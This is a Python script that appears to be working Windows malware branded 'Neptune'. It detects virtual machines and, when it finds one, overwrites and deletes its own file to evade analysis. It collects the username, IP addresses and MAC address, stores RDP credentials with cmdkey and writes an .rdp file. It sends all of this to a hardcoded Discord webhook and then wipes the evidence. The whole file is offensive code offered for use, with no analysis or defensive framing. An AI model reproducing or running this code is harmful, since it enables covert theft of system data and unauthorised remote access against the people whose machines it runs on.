import os
from getmac import get_mac_address 
import re
import datetime
import subprocess
from Crypto.Random import get_random_bytes
from discord_webhook import DiscordWebhook ,DiscordEmbed
import platform
import base64

def delete_(file_path):
    taille = os.path.getsize(file_path)

    patterns = [
        b'\x00',  
        b'\xFF',  
        b'\x00',  
    ]

    for i, pattern in enumerate(patterns):
        with open(file_path, 'wb') as f:
            f.write(pattern * taille)

    with open(file_path, 'wb') as f:
        f.write(get_random_bytes(taille))

    os.remove(file_path)


def grabber_windows():
    user_windows = os.getenv("USERNAME")
    mdp = base64.b64encode(get_random_bytes(16)).decode('ascii')

    ip_conf = os.popen('ipconfig').read()

    ipv4 = re.findall(r'Adresse IPv4[.\s]+:\s*([\d.]+)', ip_conf)
    ipv6 = re.findall(r'Adresse IPv6[^\:]+:\s*([a-fA-F0-9:]+(?:%\w+)?)', ip_conf)

    mac_adrr = get_mac_address()

    def create_rdp(ip, username, password, port=3389):
        filename = os.path.join(os.getenv("TEMP"), f"{username}_.rdp")

        target = f"TERMSRV/{ip}:{port}"

        subprocess.run([
            "cmdkey",
            f"/generic:{target}",
            f"/user:{username}",
            f"/pass:{password}"
        ], capture_output=True, text=True)

        rdp_content = f"""screen mode id:i:2
    use multimon:i:0
    desktopwidth:i:1920
    desktopheight:i:1080
    session bpp:i:32
    full address:s:{ip}:{port}
    username:s:{username}
    prompt for credentials:i:0
    authentication level:i:2
    enablecredsspsupport:i:1
    """

        with open(filename, "w", newline="\r\n") as f:
            f.write(rdp_content)

        return filename

    create_rdp(
        ip=ipv4[0],
        username=user_windows,
        password=mdp
    )

    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1479546753530204323/5cqaT5p7VdaaTj7pZfYomO7zTyqMh2kJQ2kr1NZRUC6NOjACq8skcE_wep38toXnEnS3', username="Neptune")

    embed = DiscordEmbed(
        title=f"Time :**{datetime.datetime.today()}", description=f"**Windows Information**\n\nWindows Account Username :**{user_windows}**\nIpV4 :**{ipv4[0]}** \nIpV6 : **{ipv6[0]}**\nMac Adresse : **{mac_adrr}**\n\nMDP File\n```**{mdp}**```"
    )
    embed.set_footer(text="Neptune", icon_url="https://media.discordapp.net/attachments/1442972281235177567/1493609631132418139/aumxqo.jpg?ex=69df97dd&is=69de465d&hm=bb34c1b74eb82e7cc516ea278d22385d1b6d0752c92ab227360354fdc6eafc54&=&format=webp&width=768&height=768")
    webhook.add_embed(embed)


    with open(f"{os.getenv('Temp')}\\{user_windows}_.rdp", "rb") as f:
        webhook.add_file(file=f.read(), filename=f"{os.getenv('Temp')}\\{user_windows}_.rdp")

    response = webhook.execute()

    delete_(f"{os.getenv('Temp')}\\{user_windows}_.rdp")

def is_virtual_machine():
    try:
        result = subprocess.run(
            ["powershell", "-Command", "(Get-WmiObject Win32_ComputerSystem).Model"],
            capture_output=True, text=True ,encoding='utf-8'
        )
        model = result.stdout.strip().lower()
        
        if any(v in model for v in ["virtual", "vmware", "virtualbox", "kvm", "hyper-v"]):
            return True
        return False
    except Exception as e:
        print("Erreur :", e)
        return None

if platform.system() == 'Windows':
    if is_virtual_machine() == True :
        taille = os.path.getsize(__file__)

        patterns = [
            b'\x00',  
            b'\xFF',  
            b'\x00',  
        ]

        for i, pattern in enumerate(patterns):
            with open(__file__, 'wb') as f:
                f.write(pattern * taille)

        with open(__file__, 'wb') as f:
            f.write(get_random_bytes(taille))

        os.remove(__file__)

    grabber_windows()